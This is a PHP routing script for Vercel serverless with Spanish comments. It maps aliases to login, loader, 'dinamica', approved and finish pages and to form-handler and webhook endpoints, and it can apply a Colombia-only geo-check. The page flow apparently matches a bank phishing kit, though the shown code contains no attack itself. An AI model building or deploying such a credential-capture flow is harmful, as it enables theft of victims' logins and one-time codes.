<?php
/**
 * Router / Dispatcher para Vercel Serverless PHP
 * Permite ejecutar cualquier script PHP del proyecto sin que Vercel intente descargarlo como archivo estático.
 */

// Verificación geográfica opcional si existe en el proyecto
if (file_exists(__DIR__ . '/../assets/config/geo_check.php')) {
    require_once __DIR__ . '/../assets/config/geo_check.php';
} elseif (file_exists(__DIR__ . '/../config/geo_check.php')) {
    require_once __DIR__ . '/../config/geo_check.php';
}

$requestUri = $_SERVER['REQUEST_URI'] ?? '/';
$path = parse_url($requestUri, PHP_URL_PATH);
$path = ltrim($path, '/');

// Si la ruta inicia con 'api/', limpiarlo para mapear
if (strpos($path, 'api/') === 0) {
    $path = substr($path, 4);
}

$rootDir = realpath(__DIR__ . '/..');

// Mapeos y alias directos para este proyecto
$aliases = [
    // Endpoints y APIs
    'config/form_handler.php' => 'config/form_handler.php',
    'form_handler.php'        => 'config/form_handler.php',
    'form_handler'            => 'config/form_handler.php',
    'config/estado.php'       => 'config/estado.php',
    'estado.php'              => 'config/estado.php',
    'estado'                  => 'config/estado.php',
    'config/webhook.php'      => 'config/webhook.php',
    'webhook.php'             => 'config/webhook.php',
    'webhook'                 => 'config/webhook.php',
    'config/set_webhook.php'  => 'config/set_webhook.php',
    'set_webhook.php'         => 'config/set_webhook.php',
    'set_webhook'             => 'config/set_webhook.php',

    // Vistas principales
    'solicitud.php'           => 'solicitud.php',
    'solicitud'               => 'solicitud.php',
    'login.php'               => 'login.php',
    'login'                   => 'login.php',
    'loader.php'              => 'loader.php',
    'loader'                  => 'loader.php',
    'approved.php'            => 'approved.php',
    'approved'                => 'approved.php',
    'dinamica.php'            => 'dinamica.php',
    'dinamica'                => 'dinamica.php',
    'finish.php'              => 'finish.php',
    'finish'                  => 'finish.php',
];

// Rutas administrativas o de Webhook exentas de filtros restrictivos
$adminExempt = [
    'webhook.php',
    'config/webhook.php',
    'set_webhook.php',
    'config/set_webhook.php',
];

// Si existe función de verificación geográfica y no es exenta
if (function_exists('verificar_colombia')) {
    if (!in_array($path, $adminExempt) && !in_array($aliases[$path] ?? '', $adminExempt)) {
        verificar_colombia();
    }
}

// Raíz o index
if (empty($path) || $path === 'index.php' || $path === 'index') {
    chdir($rootDir);
    require $rootDir . DIRECTORY_SEPARATOR . 'index.php';
    exit;
}

// Búsqueda por alias
if (isset($aliases[$path])) {
    $targetFile = realpath($rootDir . DIRECTORY_SEPARATOR . str_replace('/', DIRECTORY_SEPARATOR, $aliases[$path]));
    if ($targetFile && is_file($targetFile)) {
        chdir(dirname($targetFile));
        require $targetFile;
        exit;
    }
}

// Búsqueda directa del archivo solicitado
$targetFile = realpath($rootDir . DIRECTORY_SEPARATOR . str_replace(['/', '\\'], DIRECTORY_SEPARATOR, $path));

// Si no tiene extensión .php, intentar agregársela
if ((!$targetFile || !is_file($targetFile)) && pathinfo($path, PATHINFO_EXTENSION) === '') {
    $targetWithPhp = realpath($rootDir . DIRECTORY_SEPARATOR . str_replace(['/', '\\'], DIRECTORY_SEPARATOR, $path . '.php'));
    if ($targetWithPhp && is_file($targetWithPhp)) {
        $targetFile = $targetWithPhp;
    }
}

// Verificar que el archivo existe dentro de la carpeta del proyecto y sea PHP
if ($targetFile && strpos($targetFile, $rootDir) === 0 && is_file($targetFile)) {
    if (pathinfo($targetFile, PATHINFO_EXTENSION) === 'php') {
        chdir(dirname($targetFile));
        require $targetFile;
        exit;
    }
}

// Fallback por defecto a index.php
chdir($rootDir);
require $rootDir . DIRECTORY_SEPARATOR . 'index.php';